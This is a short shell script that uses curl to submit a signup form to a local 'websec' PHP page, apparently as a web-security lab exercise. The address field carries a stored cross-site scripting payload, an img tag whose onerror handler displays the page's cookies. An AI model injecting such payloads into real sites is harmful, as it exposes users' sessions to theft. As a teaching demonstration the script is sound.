#!/bin/sh

curl -X POST localhost/websec/signup.php \
	-d "email=hejsan@curl" \
	-d "name=curl4hax" \
	-d "address=<img src=x onerror=\"alert('here are your cookies'); alert(document.cookie);\"\/>" \
	-d "password=allizwell123" \
	-d "password_repeat=allizwell123"